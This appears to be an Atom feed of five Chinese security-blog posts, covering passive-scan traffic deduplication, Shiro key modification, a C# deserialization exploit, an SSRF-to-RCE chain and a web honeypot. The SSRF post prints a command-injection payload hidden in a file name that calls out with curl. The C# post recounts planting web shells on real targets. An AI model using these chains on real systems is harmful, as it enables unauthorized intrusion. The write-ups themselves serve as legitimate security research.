<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://blog.thekingofduck.com</id>
    <title>CoolCat&apos; Blog</title>
    <updated>2021-11-08T10:40:27.833Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://blog.thekingofduck.com"/>
    <link rel="self" href="https://blog.thekingofduck.com/atom.xml"/>
    <subtitle>当代废物</subtitle>
    <logo>https://blog.thekingofduck.com/images/avatar.png</logo>
    <icon>https://blog.thekingofduck.com/favicon.ico</icon>
    <rights>All rights reserved 2021, CoolCat&apos; Blog</rights>
    <entry>
        <title type="html"><![CDATA[被动扫描中http流量清洗]]></title>
        <id>https://blog.thekingofduck.com/post/url-normalize-in-passive-scan/</id>
        <link href="https://blog.thekingofduck.com/post/url-normalize-in-passive-scan/">
        </link>
        <updated>2021-11-08T10:32:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x00-写在前面">0x00 写在前面</h3>
<p>几个月前写的被动扫描工具<code>rcefuzzer</code>的实际使用效果挺好的,除了被污染的流量贼太娘的多以外，需要清洗掉无意义的流量。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/16360956681866/16363613590388.jpg" alt="" loading="lazy"></figure>
<h3 id="0x01-核心问题">0x01 核心问题</h3>
<p>减少请求数量的核心问题是:</p>
<pre><code>如何确定流量是否是重复的?
</code></pre>
<p>一个完整的标准链接包含了协议,凭证,目的地址,目标端口,路由,参数,描点这7部分,凭证和描点,其中凭据和描点都属于浏览器层面用户操作体验的问题,不用考虑。那么将其他五个部分加上不同的请求方法组成一个向量就是:</p>
<pre><code>请求方法:协议:域名:端口:URL路径:参数名称排序合集
</code></pre>
<p>请求方法,协议,域名,端口这四个的变化比较小,基本上是固定的,也不用考虑怎么考虑。</p>
<h3 id="0x02-路由处理">0x02 路由处理</h3>
<p>URL路径的花样会比较多,去除资源文件的不多说,这里主要考虑其他情况,比如</p>
<pre><code>A:/path1/path2
B:///path1////path2
</code></pre>
<p>这里在处理的时候比较好奇中间件是怎么判断两个路由等效的,于是翻了以下代码,在<code>org.apache.catalina.connector.CoyoteAdapter#normalize</code>中可以看到代码对<code>\</code>,<code>//</code>,<code>/./</code>,<code>/../</code>等字符串进行了处理,路径标准化后再去做<code>servlet</code>调度。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/16360956681866/96827ED7-684C-4B18-A7EF-169E63A6B985.png" alt="96827ED7-684C-4B18-A7EF-169E63A6B985" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/16360956681866/133DE564-841D-4463-AE59-8C18EE80FDFF.png" alt="133DE564-841D-4463-AE59-8C18EE80FDFF" loading="lazy"></figure>
<p>对于做流量清洗来说，只需要关注：</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/16360956681866/2EC0B35D-A87C-4BF0-8C82-69BDC1A60A09.png" alt="2EC0B35D-A87C-4BF0-8C82-69BDC1A60A09" loading="lazy"></figure>
<p>这个实现读起来没那么友好,那么可以改写为：</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/16360956681866/479F2B17-E5E9-4B15-A4F5-DC9B9F2E8F73.png" alt="479F2B17-E5E9-4B15-A4F5-DC9B9F2E8F73" loading="lazy"></figure>
<p>再比如:</p>
<pre><code>A:/news/1
B:/news/2
A:/news/1/read
B:/news/2/edit
</code></pre>
<p>很明显的是restfull风格或者伪静态的写法，AB属于同一个路由，BC不同，后端的写法可能是：</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/16360956681866/4FAC106D-9AE0-4616-B244-95643D6D3C1E.png" alt="4FAC106D-9AE0-4616-B244-95643D6D3C1E" loading="lazy"></figure>
<p>处理思路也比较清楚,路径标准化后再切割一下,尝试转换成不通的整数，相同的视作同一路由即可。</p>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/16360956681866/78C9522E-188A-4D7B-B168-9283423A9920.png" alt="78C9522E-188A-4D7B-B168-9283423A9920" loading="lazy"></figure>
<p>除了数字这种还经常遇到用hash或者uuid的,处理方式差不多，判断依据均已标准化后的路由为准。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/16360956681866/BF86F158-F069-433D-AD76-AA54D59D1084.png" alt="BF86F158-F069-433D-AD76-AA54D59D1084" loading="lazy"></figure>
<h3 id="0x03-参数处理">0x03 参数处理</h3>
<p>已经考虑到的后端写法如：</p>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/16360956681866/493DFA24-BE9A-4C00-BAD7-AA44DFFDF057.png" alt="493DFA24-BE9A-4C00-BAD7-AA44DFFDF057" loading="lazy"></figure>
<p>对应的URL如下：</p>
<pre><code>A:/news?id=2
B:/news?action=edit&amp;id=2
C:/news?action=del&amp;id=2
D:/news?id=2&amp;action=del
</code></pre>
<p>从相邻的来看,AB的参数不同,扫完A肯定得接着扫,但B扫完再扫C实际意义不大。CD的参数顺序不通,但本质上D和BC也是一样的。综合下来处理的思路是获取所有参数名排序后组成一个向量,作为判断流量是否重复的依据。也就是说,ABCD实际上只需要扫描AB即可。</p>
<h3 id="0x04-写在最后">0x04 写在最后</h3>
<p>orz... 做的时候感觉蛮多东西可以玩的,写出来就感觉索然无味,被自己菜哭ಥ_ಥ。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/16360956681866/16363673467767.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[关于shiro漏洞利用中key的修改]]></title>
        <id>https://blog.thekingofduck.com/post/TheWayToChangeShiroKey/</id>
        <link href="https://blog.thekingofduck.com/post/TheWayToChangeShiroKey/">
        </link>
        <updated>2021-10-21T10:07:17.000Z</updated>
        <content type="html"><![CDATA[<pre><code>Author:TheKingOfDuck@JJ官方认证菜逼
</code></pre>
<p>首先需要准备一个<code>shiro</code>的漏洞环境,这里B叨叨一句,从阿里云的<code>spring server</code>拉回来的模板，模板引擎默认配置有毛病，真鸡儿烦人。环境主要代码都是抄的<code>vulhub</code>，不是自己写的。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16347971709406.jpg" alt="" loading="lazy"></figure>
<p>要修改<code>shiro</code>的<code>Key</code> 我们应该要明白<code>shiro key</code>存在那儿。在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>这个接口中。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16347981125460.jpg" alt="" loading="lazy"></figure>
<p>注意看，这只是默认<code>key</code>而已，很多时候找到的<code>key</code>都是从配置文件里面读出来的，并非默认这个，官方提供的有接口可以获取或设置这个值。</p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16347984164953.jpg" alt="" loading="lazy"></figure>
<p>继承这个接口的类在<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>,可以调他获取一个看看。</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16347998577301.jpg" alt="" loading="lazy"></figure>
<p>看着好像没啥毛病，但实际测试会发现这个值并不是程序真正在用的值，直接在路由里去<code>set</code>一个值也没生效，为什么？因为获取到的值就不是同一个对象里面的。程序的配置在初始化的时候就在配置类中初始化了一个<code>CookieRememberMeManager</code>对象，程序用的一直是他，而不是自己<code>new</code>出来的那个。</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348023443427.jpg" alt="" loading="lazy"></figure>
<p>那如果想设置的话也得是在这里设置。比如：</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348024099778.jpg" alt="" loading="lazy"></figure>
<p>这样是没毛病的</p>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348024854239.jpg" alt="" loading="lazy"></figure>
<p>可真实日站的环境中就没那么容易了，没法让你直接修改执行<code>Java</code>代码，这就得利用<code>Java</code>反射相关的技术去获取这一对象，并修改里面的值。</p>
<p>构造的过程会很麻烦，不通环境中遇到的情况会不一样，比如在这份代码中需要修改的bean对象的命名是<code>shiroFilter</code>而不是<code>shiroFilterFactoryBean</code>(其他环境多数为<code>shiroFilterFactoryBean</code>)，所以给的代码需要调整以下，这是不用脑子也能完成的事情。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348032696144.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348031401930.jpg" alt="" loading="lazy"></figure>
<p>改完访问一下<code>/setshirokey</code>路由测试一下，没啥毛病。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348034698297.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="11"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348037013176.jpg" alt="" loading="lazy"></figure>
<p>修改的代码调好了，下一步就是塞进<code>yso</code>中生成序列化的数据，再按照<code>shiro</code>的加密方式加密后发包。</p>
<figure data-type="image" tabindex="12"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348096084628.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://blog.thekingofduck.com/post-images/16347962792332/16348096363566.jpg" alt="" loading="lazy"></figure>
<p>发包后再测试 稳得一逼.<br>
<img src="https://blog.thekingofduck.com/post-images/16347962792332/16348096680919.jpg" alt="" loading="lazy"></p>
<p>写在最后：</p>
<pre><code>写这个是因为看到tw上有人发了一段废话，大概就是『我弄出shiro key修改的方法了，但是我不告诉你』。真是听君一些话，如听一席话。。。这早就有的东西。
群里划水的时间就顺便写了，仅供娱乐使用。
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记一个黑盒挖到的C#程序反序列化漏洞]]></title>
        <id>https://blog.thekingofduck.com/post/CSharpProgramDeserialize/</id>
        <link href="https://blog.thekingofduck.com/post/CSharpProgramDeserialize/">
        </link>
        <updated>2021-09-15T10:12:34.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>Author: TheKingOfDuck</p>
</blockquote>
<p>很久之前黑盒挖到的一个漏洞，过程比较有意思。</p>
<p>前置知识:</p>
<pre><code>https://xz.aliyun.com/t/9168
https://xz.aliyun.com/t/9591
https://xz.aliyun.com/t/9593
https://xz.aliyun.com/t/9592
https://xz.aliyun.com/t/9594
https://xz.aliyun.com/t/9595
https://xz.aliyun.com/t/9597
https://xz.aliyun.com/t/9598
https://xz.aliyun.com/t/9599
https://xz.aliyun.com/t/9600
https://xz.aliyun.com/t/9601
https://xz.aliyun.com/t/9602
https://xz.aliyun.com/t/9603
https://xz.aliyun.com/t/9604
https://xz.aliyun.com/t/9605
</code></pre>
<p>懒得挨个点开可以直接查看主页:</p>
<pre><code>https://xz.aliyun.com/u/12258
</code></pre>
<p>Y4er的文章应该全文背诵.</p>
<h3 id="0x01-起">0x01 起</h3>
<p>拿到一个压缩包,里面有个客户端程序但根本不敢运行,怕被反打被钓鱼,所以只是翻了翻程序运行配置和日志,配置中找到一组账号密码,有加密但是估计问题不大,如果账号密码正确直接运行应该是可以登录的。环境有些恶劣,物理机本身都卡装虚拟机运行肯定是不现实的,只得先拖进peid查一下看看是什么程序,研究一下密码明文能不能解出来,没准其他地方也能用。</p>
<p>拖进<code>PEID</code>的时候意外发生了,不小心点了一下导致程序运行了。看到登录框有账号密码虽然验证了猜想,但运行是件非预期的事情,赶紧关闭,然后拖进360杀毒扫了一下,有两个<code>dll</code>报毒...那种恐慌感至今记忆犹新。排查计划任务排查进程删敏感文件,一套操作下来仍不放心,就差关机换机器了。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316737974277.jpg" alt="" loading="lazy"></figure>
<p>所幸后续在VT查出报毒的两个<code>dll</code>都是多年前就被标记的,显然不可能是为了当前场景准备的水坑,逆向看代码也未找到什么可疑的代码段,故正常运行,账号也确实可登陆,权限为某部们下的管理员,可查看该部门下所有员工的信息以及跳转认证到一些其他系统,相关功能及站点未发现可<code>getshell</code>的点,该部门也和推断的管理目标的部门有些远,已知了账号规律和默认密码,故希望爆破获取到权限更高一些的账号,方便查看更多的信息,登录更多的系统。</p>
<h3 id="0x02-承">0x02 承</h3>
<p>抓包发现流量是有加密的,无法直接爆破,需要解决加密问题。</p>
<p><strong>代码分析:</strong></p>
<p>根据登录按钮的文字提示定位到对应的点击事件:</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316897826629.jpg" alt="" loading="lazy"></figure>
<p>点击后会判断账号密码验证码这些是否为空,然后进入登录事件<code>OnLoginEvent</code></p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316906394011.jpg" alt="" loading="lazy"></figure>
<p>往下继续跟会发现比较有意思的点是它没有直接传递输入框中拿到的值,而是塞进<code>UserInfo</code>里,再调用<code>SendLoginMsg</code>方法进一步处理</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316909581522.jpg" alt="" loading="lazy"></figure>
<p>继续套娃,将<code>UserInfo</code>塞到<code>MsgSysInfo</code>再调<code>zip</code>的对象中<code>GetBuffer</code>方法去处理最后交个给<code>Login</code>方法,看到这初步怀疑程序可能有问题,就算没有直接传递相关值,那到最后发送相关的处理前应该要转成<code>json</code>之类的才符合预期。</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316920311571.jpg" alt="" loading="lazy"></figure>
<p><code>zip</code>和<code>dh</code>是分别在构造方法及其调用的<code>Init</code>方法中初始化完成,前者里面的相关方法主要是数据压缩加密,后者是数据发送。<br>
<img src="https://blog.thekingofduck.com/post-images/16316733199903/16316933138030.jpg" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316929693665.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316932189590.jpg" alt="" loading="lazy"></figure>
<p>先看被调用的<code>YYSharpZip</code>中的<code>GetBuffer</code>方法,调用顺序如下图所示,<code>GetZipBuffer</code>方法在压缩之前先调<code>BinaryFormatter</code>对传入的对象进行了序列化操作,完了再去调加密方法<code>EncryptData</code>进行数据加密。<br>
<img src="https://blog.thekingofduck.com/post-images/16316733199903/16316926747757.jpg" alt="" loading="lazy"></p>
<p>客户端对数据处理的过程中有序列化的操作,那服务端接受到数据后必然有反序列化的操作,盲猜有洞,整理调用流程如下:</p>
<pre><code>this.btnLogin_Click --&gt; this.OnLoginEvent() --&gt; this.SendLoginMsg() --&gt; this.zip.GetBuffer() --&gt; this.ZipData() --&gt; this.GetZipBuffer() --&gt; new BinaryFormatter().Serialize() --&gt; this.CompressToByte() --&gt; new YYEncrypt().EncryptData() --&gt; this.dh.Login()
</code></pre>
<p>盲猜服务器处理逻辑流程如下:</p>
<pre><code>XXX.MsgReceive --&gt; new YYEncrypt().DecryptData--&gt;this.DeCompressToBytes --&gt; new BinaryFormatter().Deserialize() --&gt; this.msgSysInfo.getLoginInfo() --&gt; XXX
</code></pre>
<p>漏洞验证逻辑应当如下:</p>
<pre><code>Ysoserial.NET --&gt; Gadget serialize data --&gt; this.zip.GetBuffer --&gt; this.ZipData --&gt; this.GetZipBuffer --&gt; new BinaryFormatter().Serialize() --&gt; this.CompressToByte --&gt; new YYEncrypt().EncryptData --&gt; Send To Tartget Server --&gt; XXX.MsgReceive --&gt; new YYEncrypt().DecryptData--&gt;this.DeCompressToBytes --&gt; new BinaryFormatter().Deserialize() --&gt; Attack success
</code></pre>
<h3 id="0x03-转">0x03 转</h3>
<p>按照猜想的验证逻辑写好漏洞利用代码,本地测试了几条<code>Gadget</code>后成功弹出计算器。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316960301985.jpg" alt="" loading="lazy"></figure>
<p>本地成功弹出计算器的<code>Gadget</code>在目标上并未正常执行,依然是重新试了几条<code>Gadget</code>后命令才得以执行成功,写文件访问不到,<code>Ysoserial.NET</code>中提供的回显方法当时未测试成功,时间紧也没法投入精力去研究其原因,Windows一直无回显执行命令就怪难受的...所幸服务器的发现服务器其他端口开了<code>iis</code>. 默认路径写<code>aspx</code>拿到<code>shell</code>.</p>
<h3 id="0x04-合">0x04 合</h3>
<p>程序是通用的,前前后后打了七八个<code>shell</code>,由于其自带的加密给<code>payload</code>上了保护伞,攻击过程并未被发现过,有意思的是内网扫描被发现后起初防御人员排查的时候采取的措施是删除某个打<code>payload</code>前会探测的特征文件。🐮得很，可关服务器才是最强防御措施！</p>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/16316733199903/16316964789051.jpg" alt="" loading="lazy"></figure>
<p>整个过程并未看到过服务端代码,看似黑盒,可站在开发的逻辑上来看,盲猜的处理逻辑是完全合理的,也就说漏洞其实是一个理所应当的过程,开发就要那么写,能怎么办? ORZ不如换份开发的工作去卷他们的饭碗得了...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[记一次从鸡肋SSRF到RCE的代码审计过程]]></title>
        <id>https://blog.thekingofduck.com/post/ssrf2rce/</id>
        <link href="https://blog.thekingofduck.com/post/ssrf2rce/">
        </link>
        <updated>2021-09-15T02:12:32.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>Author: TheKingOfDuck@0KEE TEAM</p>
</blockquote>
<p>Python标准库中用来处理HTTP相关的模块是urllib/urllib2，不过其中的API十分零碎，比如urllib库有urlencode,但urllib2没有,经常需要混在一起使用,换个运行环境可能又无法正常运行,除了urllib和urllib2之外,会经常看到的还有一个urllib3,该模块是服务于升级的http 1.1标准，且拥有高效http连接池管理及http代理服务的功能库,但其并非python内置,需要自行安装,使用起来仍很复杂,比如urllib3对于POST和PUT请求(request),需要手动对传入数据进行编码，然后再加在URL之后,非常麻烦。requests是基于urllib3封装的,继承了urllib2的所有特性,遵循Apache2 Licensed开源协议的HTTP库，支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动响应内容的编码，支持国际化的URL和POST数据自动编码。如他的口号HTTP for Humans所说,这才是给人用的HTTP库,实际使用过程中更方便,能够大大的提高使用效率,缩短写代码的时间。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16276115222982.jpg" alt="" loading="lazy"></figure>
<p>实战中遇到过这样一个案例,一个输入密码正确后会302跳转到后台页面的登录口存在盲注,但登录数据有加密,无法试用sqlmap完成自动注入的过程,于是想编写python脚本自动化完成这个过程,requests是首选,实际编写过程中会发现默认属性下其无法获取到30X状态码的详情,分析其代码后发现requests的所有请求方法(GET/POST/HEAD/PUT/DELETE)均会默认跟随30X跳转,继承了urlib3默认跟随30X跳转的属性,并将30X连续跳转的次数上限从3次修改为30次,如果返回状态码是304/305/306/309会保持原来的请求方法,但不会跳转,返回状态码是307/308会保持原请求方法,并且跳转,其他30x状态码则会将请求方法转化为GET。如需禁止跳转需将allow_redirects属性的值设置为False。</p>
<p>下面将分享一个因为这个特性导致的从ssrf到rce的漏洞组合拳。</p>
<h3 id="0x01-起">0x01 起</h3>
<p>某系统的升级功能可配置自定义的站点, 点击升级按钮后会触发向特定路由发送文件, 也就是一个鸡肋的<code>POST</code>类型的<strong>路由和参数均不可控</strong>的<code>SSRF</code>。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16274405259038.jpg" alt="" loading="lazy"></figure>
<p>如下图,<code>**_update</code>是从用户自定义的配置中取的, 与固定的<code>route</code>变量拼接后作为发送文件的<code>url</code></p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-2-.png" alt="carbon -2-" loading="lazy"></figure>
<p>利用上文提到的requests默认跟随状态码<code>30X</code>跳转的特性, 可将这个鸡肋的<code>SSRF</code>变成一个<code>GET</code>类型的<strong>路由和参数均可控</strong>的<code>SSRF</code></p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231399852941.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231403597550.jpg" alt="" loading="lazy"></figure>
<h3 id="0x02-承">0x02 承</h3>
<p>该软件的分层大致如下图, 鉴权在应用层, 涉及数据涉及敏感操作的均通过api调用另一个端口的上的服务, 该过程无鉴权。思路比较清晰, 可审计服务层的代码漏洞结合已有的<code>SSRF</code>进一步扩大危害。</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231420987479.jpg" alt="" loading="lazy"></figure>
<p>受这个<code>SSRF</code>本身的限制, 寻找服务层漏洞时优先看请求方式为<code>GET</code>的路由, 筛选后找到一个符合条件的漏洞点如下图所示, 传入的<code>doc_file_path</code>参数可控, 如果文件名中能带入自己的恶意<code>Payload</code>且文件能够存在的情况下, 拼接到<code>cmd</code>变量中后有机会<code>RCE</code>。</p>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-5-.png" alt="carbon -5-" loading="lazy"></figure>
<p>走到命令拼接的前置条件是文件存在, 故先查看上传部分代码, 如下图所示, <a href="https://docs.python.org/zh-cn/3/library/tempfile.html#tempfile.mkstemp">mkstemp方法</a>的作用是以最安全的方式创建一个临时文件, 该文件的文件名随机, 创建后不会自动删除, 需用户自行将其删除, <code>suffixs</code>是指定的后缀, 也就是说文件虽然可以落地, 但文件名不可控, 无法拼接自己的<code>Payload</code>。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-6-.png" alt="carbon -6-" loading="lazy"></figure>
<p>此时只能作为一个任意文件删除的漏洞来使用, 配置升级链接<code>301</code>跳转到<code>http://127.0.0.1:8848/api/doc?doc_file_path=/etc/passwd</code>, 其中<code>doc_file_path</code>参数为已知的存在的文件, 点击系统升级按钮即可触发删除操作。</p>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231450850678.jpg" alt="" loading="lazy"></figure>
<h3 id="0x03-转">0x03 转</h3>
<p>继续分析代码，阅读大量代码后找到一处上传文件的功能点如下图所示, 其中<code>file_pre</code>为源文件名, 拼接下划线,时间戳以及<code>.txt</code>后保存并返回了完整的文件路径，正好符合上面的要求。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/16231381871104/carbon%20-7-.png" alt="carbon -7-" loading="lazy"></figure>
<p>源文件名可控, 路径已知,<code>SSRF</code>升级<code>RCE</code>变得索然无味, 使用分号切割命令语句,带参数的命令可以使用<code>${IFS}</code>绕一下空格问题, 涉及到的<code>${;</code>均为unix系统文件名允许使用范围的字符。</p>
<figure data-type="image" tabindex="11"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231467468992.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231473020945.jpg" alt="" loading="lazy"></figure>
<h3 id="0x04-合">0x04 合</h3>
<p>参数及路由均不可控<code>POST</code>类型的<code>SSRF</code> -&gt; <code>requests</code> <code>30X</code>跳转特性 -&gt; 参数和路由均可控的<code>GET</code>类型<code>SSRF</code> -&gt; 文件名部分可控的文件上传 -&gt; 多点结合攻击本地服务</p>
<p>最终Payload如下:</p>
<pre><code>http://127.0.0.1:8848/api/doc?doc_file_path=
/opt/work/files/target_file/admin/;curl${IFS}rce.me;_1623123227304.txt
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231476384950.jpg" alt="" loading="lazy"></figure>
<p>配置完成手动点击一下升级功能即可触发命令执行。</p>
<figure data-type="image" tabindex="14"><img src="https://blog.thekingofduck.com/post-images/16231381871104/16231477715089.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Loki - 一个轻量级Web蜜罐]]></title>
        <id>https://blog.thekingofduck.com/post/loki-web-honeypot/</id>
        <link href="https://blog.thekingofduck.com/post/loki-web-honeypot/">
        </link>
        <updated>2021-01-31T11:42:23.000Z</updated>
        <content type="html"><![CDATA[<p>https://github.com/TheKingOfDuck/Loki</p>
<h3 id="0x01-why">0x01 Why</h3>
<p>目标: 抓漏洞.<br>
大概是没有找到啥子开源的符合我预期的蜜罐吧，所以自己动手写了。</p>
<h3 id="0x02-what">0x02 What</h3>
<p>想做什么样的蜜罐?</p>
<p>1.便于维护,随开随用,配置简单。<br>
2.Web低仿真即可,且只抓Web流量。<br>
3.不同端口指向不同的页面,响应头配置等。</p>
<h3 id="0x03-how">0x03 How</h3>
<p>SpringBoot是最强Web框架没有之一,数据库选用SQLite。两者结合基本上就可以实现一个jar加db文件就完成需求。</p>
<h3 id="0x04-process">0x04 Process</h3>
<p>管理页面选用layui作为前端框架,后台地址和端口以及账号密码通过配置文件动态配置。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1612093490242.jpg" alt="" loading="lazy"></figure>
<p>多端口方便其实就是给tomcat添加几个监听的端口而已:</p>
<pre><code>Connector connector = new Connector(&quot;org.apache.coyote.http11.Http11NioProtocol&quot;);
connector.setScheme(scheme);
connector.setPort(Integer.parseInt(port));
result.add(connector);
</code></pre>
<p>然后是不同端口指向不同页面:</p>
<p>配置文件</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1612093569434.jpg" alt="" loading="lazy"></figure>
<p>判断逻辑</p>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/1612093585093.jpg" alt="" loading="lazy"></figure>
<p>port是限制的端口,path是本地模板的路径,code是返回的状态码,header是相应的header,respbody本来是想正对一些特定的请求返回不同页面的,逻辑没有思考的很清楚,暂时搁置了。</p>
<h4 id="页面捕获">页面捕获</h4>
<p>过程比较耗时间,期初想拦截所有异常,在做统一处理即可,可实际过程发现springboot默认开起了add-mappings无法捕获404页面,而且静态资源过来的请求无法捕获,如果遇到解析差异那种洞就只能错过。关闭的话静态资源访问配置又会很麻烦。</p>
<p>查阅相关文档后发现可以继承  ErrorController + @ControllerAdvice + @ExceptionHandle 处理一切异常,这也包括404页面,</p>
<p>Demo:</p>
<pre><code>NotFoundController.java

@Controller
public class NotFoundController implements ErrorController {
 
    @Override
    public String getErrorPath() {
        return &quot;/error&quot;;
    }
    @RequestMapping(value = {&quot;/error&quot;})
    public Object error(HttpServletRequest request) {
        //请求处理
        return &quot;404&quot;;
    }
}
</code></pre>
<pre><code>ExceptionController.java

@ControllerAdvice
public class ExceptionController {
 
    @ExceptionHandler(value = {Exception.class})
    public Object error(Exception ex){
        //请求处理
        return &quot;500&quot;;
    }
}
</code></pre>
<p>这也处理确实能捕获到404页面,可是有个bug</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/1612093604938.jpg" alt="" loading="lazy"></figure>
<p>getServletPath方法获取的路由恒为error,这也是springboot的特征之一,所有错误均会交由error路由处理,也就是说error默认是肯定存在的。</p>
<p>正确的处理方式是在过滤器中进行记录:</p>
<pre><code>public class LokiFilter implements Filter{

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        log.info(&quot;Loki Filter is init.... &quot;);
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        //请求处理
        filterChain.doFilter(request, response);
    }

    @Override
    public void destroy() {
        log.info(&quot;Loki Filter was destroyed....&quot;);
    }
}
</code></pre>
<p>嗯,内存马也得在这层搞,不然鬼知道别人路由咋写的。</p>
<h3 id="0x05-result">0x05 Result</h3>
<p>代码结构:</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/1612093623129.png" alt="" loading="lazy"></figure>
<p>后台页面:</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/1612093636730.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/1612093761078.png" alt="" loading="lazy"></figure>
<p>模板文件:</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/1612093774985.jpg" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/1612093789285.jpg" alt="" loading="lazy"></figure>
<p>一些有趣的事情:</p>
<p>1.在公网跑起来后我收到的第一个请求是nmap扫cobaltstrike的。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/1612093806150.png" alt="" loading="lazy"></figure>
<p>2.配置的通达和致远的页面都被来自河南和云南的两个IP人为访问过两次,识别依据是浏览器会自动加载/favicon.ico,脚本不会。</p>
<p>3.被89.248.160.151这个IP扫了一通.txt的文件,还有一些请求路径是@.txt,不知道是不是扫描器没配好。</p>
<figure data-type="image" tabindex="11"><img src="https://blog.thekingofduck.com/post-images/1612093827620.png" alt="" loading="lazy"></figure>
<p>4.创宇的censys爬虫先是先访问了8090端口,然后是88端口,中间间隔了将近14小时,bing的爬虫也到访过一次,fofa的爬虫没看到,但是有上百条ua为Go-http-client/1.1和fasthttp的请求,python的只有一条。</p>
<p>5.捕获了两个漏洞:</p>
